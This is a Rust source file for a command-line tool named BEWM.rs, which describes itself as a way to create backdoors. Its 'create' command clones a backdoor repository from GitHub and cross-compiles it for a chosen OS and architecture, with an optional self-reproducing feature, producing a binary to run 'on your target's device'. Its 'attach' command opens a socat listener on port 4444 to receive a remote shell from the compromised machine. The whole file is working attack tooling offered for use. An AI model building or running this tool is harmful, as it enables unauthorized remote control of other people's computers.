use clap::{App, Arg, SubCommand};
use colored::*;
use dialoguer::Input;
use requestty::Question;
use std::io::Write;
use std::str::from_utf8;
use std::{
    env::current_dir,
    process::{self, Command},
};
use std::{
    fs::{copy, remove_dir_all},
    process::Stdio,
};

fn main() {
    let systems = vec!["macOS", "windows", "linux"];
    let arches = vec!["64", "32"];
    let system_rust_names = vec!["apple-darwin", "pc-windows-gnu", "unknown-linux-musl"];
    let arch_rust_names = vec!["x86_64", "i686"];
    let arch: String;
    let direc = current_dir().unwrap();
    let matches = App::new("BEWM.rs")
        .about("Backdoors Effortlessly, With Mainly rust.")
        .setting(clap::AppSettings::ArgRequiredElseHelp)
        .version("0.1.0")
        .author("Jabster28 <justynboyer@gmail.com>")
        // .arg(
        //     Arg::with_name("v")
        //         .short("v")
        //         .multiple(true)
        //         .help("Sets the level of verbosity"),
        // )
        .subcommand(
            SubCommand::with_name("attach")
                .about("connect to a target computer that's already been bewm'd"),
        )
        .subcommand(
            SubCommand::with_name("create")
                .about("creates a BEWM executable to be ran on the target OS")
                .arg(
                    Arg::with_name("target")
                        .short("t")
                        .long("target")
                        .alias("os")
                        .help("target OS to build to")
                        .case_insensitive(true)
                        .possible_values(&systems)
                        .takes_value(true),
                )
                .arg(
                    Arg::with_name("architecture")
                        .short("a")
                        .long("arch")
                        .alias("arch")
                        .help("arch target to build to")
                        .case_insensitive(true)
                        .possible_values(&arches)
                        .takes_value(true),
                ),
        )
        .get_matches();
    if let Some(ref matches) = matches.subcommand_matches("create") {
        println!("Welcome to the BEWM creator! 💥");
        let mut targ = None;
        if !matches.is_present("target") {
            let question = Question::select("stuff")
                .message("Which OS do you want to BEWM?")
                .choices(systems.clone())
                .build();

            targ = Some(requestty::prompt(vec![question]).unwrap());
        }
        let question2 = Question::select("a")
            .message("With which architecture?")
            .choices(arches.clone())
            .build();

        let arc = requestty::prompt(vec![question2]).unwrap();
        let question3 = Question::confirm("rep")
            .message("Include BEWMC in binary?")
            .default(true)
            .build();

        let rep = requestty::prompt(vec![question3]).unwrap();

        let selection = if !matches.is_present("target") {
            targ.unwrap()
                .get("stuff")
                .unwrap()
                .as_list_item()
                .unwrap()
                .text
                .clone()
        } else {
            systems[systems
                .iter()
                .position(|&e| {
                    e.to_lowercase() == matches.value_of("target").unwrap().to_lowercase()
                })
                .unwrap()]
            .to_string()
        };
        if selection != "macOS" {
            arch = if !matches.is_present("architecture") {
                arc.get("a").unwrap().as_list_item().unwrap().text.clone()
            } else {
                arches[arches
                    .iter()
                    .position(|&e| {
                        e.to_lowercase() == matches.value_of("architecture").unwrap().to_lowercase()
                    })
                    .unwrap()]
                .to_string()
            };
            // arch = Select::new().items(&arches).default(0).interact().unwrap();
        } else {
            arch = "64".to_string();
        }
        println!("{}", "Downloading BEWM code...".yellow());
        // copy_items(
        //     &vec!["/Users/sticks/git/bewm"],
        //     dir_path.to_owned(),
        //     &options,
        // )
        // .unwrap();
        remove_dir_all(direc.join("bewm_compiled")).unwrap_or_else(|_| {});

        let mut x = Command::new("git")
            .arg("clone")
            .arg("https://github.com/Jabster28/bewm/")
            .arg(direc.join("bewm_compiled"))
            .spawn()
            .unwrap_or_else(|err| {
                eprintln!("Error: cargo failed.");
                eprintln!("{:?}", err);
                process::exit(1)
            });
        x.wait().unwrap();

        println!("{}", "Checking for cross in $PATH...".yellow());
        match Command::new("cross").arg("-v").output() {
            Ok(_) => println!("{}", "Found!".green()),
            Err(_) => {
                println!("{}", "Not found, installing through cargo...".yellow());
                let mut y = Command::new("cargo")
                    .arg("install")
                    .arg("cross")
                    .spawn()
                    .unwrap_or_else(|_e| panic!("Error: cargo failed."));
                y.wait().unwrap();
            }
        }
        println!(
            "{}",
            format!(
                "Building for {} using cross...",
                arch_rust_names[arches.iter().position(|&e| e.to_string() == arch).unwrap()]
                    .to_owned()
                    + "-"
                    + system_rust_names[systems
                        .iter()
                        .position(|&e| e.to_string() == selection)
                        .unwrap()]
            )
            .yellow()
        );
        if (Command::new("cross")
            .current_dir(direc.join("bewm_compiled"))
            .arg("build")
            .arg("--release")
            .args("--features busybox".split(' '))
            .args(if rep.get("rep").unwrap().as_bool().unwrap() {
                "--features reproduce".split(' ').collect()
            } else {
                vec![]
            })
            // .arg("--manifest-path")
            // .arg(direc.join("bewm").join("Cargo.toml"))
            .arg(
                "--target=".to_owned()
                    + &arch_rust_names[arches.iter().position(|&e| e.to_string() == arch).unwrap()]
                    + "-"
                    + &system_rust_names[systems
                        .iter()
                        .position(|&e| e.to_string() == selection)
                        .unwrap()],
            )
            .spawn()
            .unwrap()
            .wait()
            .unwrap())
        .code()
        .unwrap()
            != 0
        {
            panic!("Error: cross failed.")
        }

        println!("{}", "Saving binary to current directory...".yellow());
        copy(
            direc.join(
                "bewm_compiled/target/".to_owned()
                    + arch_rust_names[arches.iter().position(|&e| e.to_string() == arch).unwrap()]
                    + "-"
                    + system_rust_names[systems
                        .iter()
                        .position(|&e| e.to_string() == selection)
                        .unwrap()]
                    + "/release/bewm"
                    + match systems
                        .iter()
                        .position(|&e| e.to_string() == selection)
                        .unwrap()
                    {
                        1 => ".exe",
                        _ => "",
                    },
            ),
            direc.join(
                "bewm".to_owned()
                    + match systems
                        .iter()
                        .position(|&e| e.to_string() == selection)
                        .unwrap()
                    {
                        1 => ".exe",
                        _ => "",
                    },
            ),
        )
        .unwrap();
        println!("{}", "Deleting old dir...".yellow());
        remove_dir_all(direc.join("bewm_compiled")).unwrap();
        println!(
            "{}",
            format!(
                "Done! You can now execute {:?} on your target's device.",
                direc.join(
                    "bewm".to_owned()
                        + match systems
                            .iter()
                            .position(|&e| e.to_string() == selection)
                            .unwrap()
                        {
                            1 => ".exe",
                            _ => "",
                        },
                )
            )
            .green()
        )
    } else if let Some(ref _matches) = matches.subcommand_matches("attach") {
        let x: u16 = Input::new()
            .with_prompt("Which port do you want to listen to?")
            .default(4444)
            .interact_text()
            .unwrap();
        let w = &Command::new("tty")
            .stdout(Stdio::piped())
            .spawn()
            .unwrap()
            .wait_with_output()
            .unwrap();

        let tty = from_utf8(&w.stdout).unwrap();
        let mut bash = Command::new("bash").stdin(Stdio::piped()).spawn().unwrap();
        write!(
            bash.stdin.take().unwrap(),
            "socat file:{:?},raw,echo=0 tcp-listen:{}",
            &tty.trim_end(),
            x
        )
        .unwrap();
        println!("Listening! Please run the executable on the target machine.");
        bash.wait().unwrap();
    }
}
